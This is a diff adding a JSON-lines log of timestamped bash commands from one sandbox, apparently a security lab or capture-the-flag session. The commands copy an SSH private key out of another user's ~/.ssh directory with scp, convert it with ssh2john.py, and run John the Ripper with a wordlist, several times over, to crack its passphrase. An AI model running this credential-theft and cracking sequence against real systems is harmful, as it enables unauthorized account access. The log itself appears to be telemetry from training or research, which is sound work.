@@ -1,0 +1,17 @@
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:02:51.996Z", "cmd_type": "bash-command", "cmd": "scp chong@server:~/.ssh/Y29yb25h ."}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:03:19.633Z", "cmd_type": "bash-command", "cmd": "vim Y29yb25h"}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:03:47.258Z", "cmd_type": "bash-command", "cmd": "nano Y26yb25h"}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:04:47.679Z", "cmd_type": "bash-command", "cmd": "cp $(locate ssh2john.py) ."}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:05:59.643Z", "cmd_type": "bash-command", "cmd": "python ssh2john.py Y29yb25h > Y29yb25h.hash"}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:06:48.831Z", "cmd_type": "bash-command", "cmd": "john Y29yb25h.hash --wordlist=/usr/share/wordlists/fasttrack.txt"}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:07:28.718Z", "cmd_type": "bash-command", "cmd": "john Y29yb25h.hash --wordlist=/usr/share/wordlists/fasttrack.txt"}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:07:39.027Z", "cmd_type": "bash-command", "cmd": "cd \\n"}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:07:50.596Z", "cmd_type": "bash-command", "cmd": "cd /usr/share/wordlists/"}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:07:52.712Z", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:08:13.898Z", "cmd_type": "bash-command", "cmd": "john Y29yb25h.hash --wordlist=/usr/share/wordlists/fasttrack.txt"}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:08:20.145Z", "cmd_type": "bash-command", "cmd": "cd .."}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:08:21.650Z", "cmd_type": "bash-command", "cmd": "cd .."}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:08:23.360Z", "cmd_type": "bash-command", "cmd": "cd .."}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:08:37.482Z", "cmd_type": "bash-command", "cmd": "cd"}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:08:40.640Z", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "124", "timestamp_str": "2021-06-30T07:09:01.821Z", "cmd_type": "bash-command", "cmd": "john Y29yb25h.hash --wordlist=/usr/share/wordlists/fasttrack.txt"}
